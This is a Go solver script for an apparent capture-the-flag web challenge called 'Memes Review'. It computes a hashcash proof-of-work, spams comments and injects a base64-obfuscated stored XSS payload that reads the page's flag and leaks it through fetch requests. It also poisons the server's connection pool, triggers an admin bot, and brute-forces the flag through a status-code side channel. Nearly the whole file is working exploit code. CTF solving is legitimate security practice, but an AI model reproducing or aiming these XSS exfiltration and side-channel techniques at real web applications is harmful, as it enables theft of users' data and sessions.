package main

import (
	"crypto/rand"
	"crypto/sha1"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

/// helpers
func GenerateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	// Note that err == nil only if we read len(b) bytes.
	if err != nil {
		return nil, err
	}

	return b, nil
}

func GenerateRandomString(n int) string {
	const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	bytes, err := GenerateRandomBytes(n)
	if err != nil {
		panic(err)
	}
	for i, b := range bytes {
		bytes[i] = letters[b%byte(len(letters))]
	}
	return string(bytes)
}

////

func poisonGoPool() {
	conn, err := net.Dial("tcp", serverAddress)
	tcpConn, ok := conn.(*net.TCPConn)
	if err != nil || !ok {
		panic(err)
	}

	lines := []string{
		fmt.Sprintf("GET %s/api/v1/comments?x=%s HTTP/1.1", globalPrefix, GenerateRandomString(32)),
		"Host: " + serverAddress,
		"Accept-Encoding: gzip",
		"Connection: keep-alive",
		"",
	}

	//syscall.SetNonblock(int(fdSocket), true)
	//tcpConn.SetNoDelay(true)
	//tcpConn.SetWriteBuffer(1)
	//tcpConn.SetReadBuffer(1)
	for _, line := range lines {
		line := line
		tcpConn.Write([]byte(line + "\r\n"))
	}
	tcpConn.CloseRead()

	buf := make([]byte, 0xffffff)
	tcpConn.Read(buf)
}

////////////////
func sha1Hash(s string) string {
	hash := sha1.New()
	_, err := io.WriteString(hash, s)
	if err != nil {
		return ""
	}
	return fmt.Sprintf("%x", hash.Sum(nil))
}
func acceptableHeader(hash string, char rune, n int) bool {
	for _, val := range hash[:n] {
		if val != char {
			return false
		}
	}
	return true
}

// base64EncodeBytes
func base64EncodeBytes(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

// base64EncodeInt
func base64EncodeInt(n int) string {
	return base64EncodeBytes([]byte(strconv.Itoa(n)))
}

type Hashcash struct {
	version   int
	bits      int
	created   time.Time
	resource  string
	extension string
	rand      string
	counter   int
}

const maxIterations int = 1 << 48        // Max iterations to find a solution
const timeFormat string = "060102150405" // YYMMDDhhmmss

func randomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}
	return b, nil
}

func NewHashcash(data string, bits int) *Hashcash {
	rand, err := randomBytes(8)
	if err != nil {
		return nil
	}
	return &Hashcash{
		version:   1,
		bits:      bits,
		created:   time.Now(),
		resource:  data,
		extension: "",
		rand:      base64EncodeBytes(rand),
		counter:   1,
	}
}

func (h *Hashcash) createHeader() string {
	return fmt.Sprintf("%d:%d:%s:%s:%s:%s:%s", h.version,
		h.bits,
		h.created.Format(timeFormat),
		h.resource,
		h.extension,
		h.rand,
		base64EncodeInt(h.counter))
}

func (h *Hashcash) Compute() (string, error) {
	var (
		wantZeros = h.bits / 4
		header    = h.createHeader()
		hash      = sha1Hash(header)
	)
	for !acceptableHeader(hash, 48, wantZeros) {
		h.counter++
		header = h.createHeader()
		hash = sha1Hash(header)
		if h.counter >= maxIterations {
			return "", errors.New("no soulution")
		}
	}
	return header, nil
}

func calcHashcash(resource string, difficult int) (string, error) {
	hc := NewHashcash(resource, difficult)
	return hc.Compute()
}

/////////////////

func getNewSpace() string {
	resp, err := http.Get("http://" + serverAddress + "/")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	dataString := string(data)

	if strings.Contains(dataString, "Memes Review") {
		return ""
	}
	if !strings.Contains(dataString, "Proof of Work:") {
		panic(dataString)
	}

	arr := strings.Split(dataString, "Proof of Work:")
	arr2 := strings.Split(arr[1], "<br>")
	cmdHashcash := strings.TrimSpace(arr2[1])
	fmt.Printf("cmdHashcash: %s\n", cmdHashcash)

	var resource string
	var difficult int
	if _, err := fmt.Sscanf(cmdHashcash, "hashcash -mb%d %s", &difficult, &resource); err != nil {
		panic(err)
	}
	fmt.Printf("difficult: %d\n", difficult)
	fmt.Printf("resource: %s\n", resource)

	outHashcash, err := calcHashcash(resource, difficult)
	if err != nil {
		panic(err)
	}
	fmt.Printf("outHashcash: %s\n", outHashcash)

	resp, err = http.PostForm("http://"+serverAddress+"/", url.Values{
		"stamp": []string{outHashcash},
	})
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	bodyString := string(body)

	if !strings.Contains(bodyString, "Here is you url: <a href=") {
		fmt.Printf("out: %s\n", string(body))
		panic("sandbox not created")
	}
	xArr1 := strings.Split(bodyString, "</a>")
	xArr2 := strings.Split(xArr1[0], "\">")
	urlSandbox := xArr2[len(xArr2)-1]
	fmt.Printf("urlSandbox: %s\n", urlSandbox)

	time.Sleep(time.Second) // just wait to task is up
	return urlSandbox
}

func addComment(nickname, comment string) bool {
	resp, err := http.Post(
		"http://"+serverAddress+globalPrefix+"/api/v1/add_comment",
		"application/json",
		strings.NewReader(fmt.Sprintf(`{"nickname":"%s","comment":"%s"}`, nickname, comment)),
	)
	if resp.StatusCode != 201 {
		return false
	}
	if err != nil {
		panic(err)
	}
	return true
}

func add100Coments() {
	for i := 0; i < 98; i++ {
		if !addComment(strings.Repeat("0", 64), strings.Repeat("0", 499)) {
			return
		}
	}

	xss2 := strings.ReplaceAll(`p='__PREFIX__';d=document.querySelector('#flag').innerHTML.match(/(CTF{.+?})/i)[0];for(var i in d)fetch(p+'/api/v1/n?'+p+'/api/v1/flag?'+d.substring(0,i-(-1)))`, "__PREFIX__", globalPrefix)
	out2 := base64.StdEncoding.EncodeToString([]byte(xss2))
	xss := strings.ReplaceAll(`<img src=x onerror=eval(atob('_TUTAJ_'))>`, "_TUTAJ_", out2)
	if len(xss) > 280 {
		panic(fmt.Errorf("len: %d", len(xss)))
	}
	out := addComment("", xss)
	fmt.Printf("out: %v, %d\n", out, len(xss))
	fmt.Printf("out: %s\n", xss2)
	fmt.Printf("out: %s\n", xss)
	if !out {
		panic(fmt.Errorf("cant add xss comment WTF"))
	}
}

func getFlag() string {
	resp, err := http.Post("http://"+serverAddress+globalPrefix+"/api/v1/flag?x="+GenerateRandomString(32), "", nil)
	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	return string(data)
}

func sendToAdmin() int {
	resp, err := http.Post("http://"+serverAddress+globalPrefix+"/api/v1/report_meme", "", nil)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

func getFlagLeakedStatusCode(flagPart string) bool {
	req, err := http.NewRequest("GET", "http://"+serverAddress+globalPrefix+"/api/v1/flag?"+flagPart, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Accept-Language", "en"+globalPrefix+"/api/v1/n?,")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	// status == 404 -> leak ok
	// status != 404 -> not leaked
	return resp.StatusCode == 404
}

func solveTask() {
	// ~85% chances to get XSS on admin

	// create new sandbox
	if globalPrefix == "" {
		globalPrefix = "/" + getNewSpace()
	}

	// add comments, last commend with xss
	add100Coments()

	// do xss on /api/v1/flag endpoint
	for i := 0; i < 100; i++ {
		poisonGoPool()
	}

	// report to admin
	adminStatusCode := sendToAdmin()
	fmt.Printf("adminStatusCode: %d\n", adminStatusCode)

	// you know the prefix of flag, check first letter of leaked data
	flag := getFlagLeakedStatusCode("C")
	if !flag {
		panic("not flag this time :(( try again")
	}

	flagPart := "CTF{"
main:
	for i := 1; i < 90; i++ {
		ch := make(chan string)
		for _, c := range "abcdefghijklmnopqrstuvwxyz_" {
			go func(flagPart, char string) {
				if getFlagLeakedStatusCode(flagPart + char) {
					ch <- char
					fmt.Printf("flagChar: %v\n", flagPart+char)
				}
			}(flagPart, string(c))
		}
		select {
		case char := <-ch:
			flagPart = flagPart + char
		case <-time.After(time.Second * 5):
			break main
		}
	}
	fmt.Printf("flag: %v\n", flagPart)
}

var globalPrefix = ""
var serverAddress = ""

func main() {
	var saddress string
	flag.StringVar(&saddress, "address", "127.0.0.1:80", "server address only ip:port")
	var ssandbox string
	flag.StringVar(&ssandbox, "sandbox", "", "sandbox prefix eg. \"hash\"")
	flag.Parse()

	serverAddress = saddress
	if ssandbox != "" {
		globalPrefix = "/" + ssandbox
	}

	solveTask()
}
